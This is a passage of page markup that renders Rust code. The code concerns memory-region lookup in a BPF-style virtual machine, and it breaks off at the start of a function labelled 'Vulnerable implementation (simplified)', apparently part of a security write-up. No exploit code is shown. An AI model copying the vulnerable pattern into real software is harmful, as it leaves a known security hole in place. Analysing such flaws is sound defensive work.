Safety:\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// \u0026mut references to the mapping cache are only created internally from methods that do not\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// invoke each other. UnalignedMemoryMapping is !Sync, so the cache reference below is\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// guaranteed to be unique.\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache \"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement98\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find_region\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cache\"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"..\"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr_end\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"contains\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"access_type \"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"==\"]}],[\"$\",\"span\",\"code-segement163\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Load\"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"||\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"ensure_writable_region\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement173\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement176\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"cow_cb\"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement183\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement184\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement185\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}],[\"$\",\"span\",\"code-segement189\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region\"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement201\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement203\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement205\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement206\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Err\"]}],[\"$\",\"span\",\"code-segement207\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement208\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"generate_access_violation\"]}],[\"$\",\"span\",\"code-segement209\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement210\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement211\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement212\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"config\"]}],[\"$\",\"span\",\"code-segement213\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement214\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" access_type\"]}],[\"$\",\"span\",\"code-segement215\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement216\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement217\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement218\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement219\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement220\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement221\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement222\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement223\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement224\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement225\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"unwrap_err\"]}],[\"$\",\"span\",\"code-segement226\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement227\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement228\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement229\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement231\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement232\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement233\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement235\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement236\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement237\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],[\"$\",\"span\",\"code-segement239\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement240\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement241\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],\"\\n\",[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement245\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement246\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Vulnerable implementation (simplified)\"]}],[\"$\",\"span\",\"code-segement247\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement249\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement250\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement251\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement252\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"update_caller_account\"]}],[\"$\",\"span\",\"code-segement253\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement254\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement256\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    invoke_context\"]}],[\"$\",\"span\",\"code-segement257\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement258\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement259\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement260\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"InvokeContext\"]}],[\"$\",\"span\",\"code-segement261\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement262\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],[\"$\",\"span\",\"code-segement264\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    memory_mapping\"]}],[\"$\",\"span\",\"code-segement265\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement266\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement267\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement268\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement269\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement270\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryMapping\"]}],[\"$\",\"span\",\"code-segement271\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement272\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement274\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    is_loader_deprecated\"]}],[\"$\",\"span\",\"code-segement275\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement276\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement277\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}],[\"$\",\"span\",\"code-segement278\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement279\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],[\"$\",\"span\",\"code-segement281\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    caller_account\"]}],[\"$\",\"span\",\"code-segement282\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement283\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement284\",{\"className\":\"token 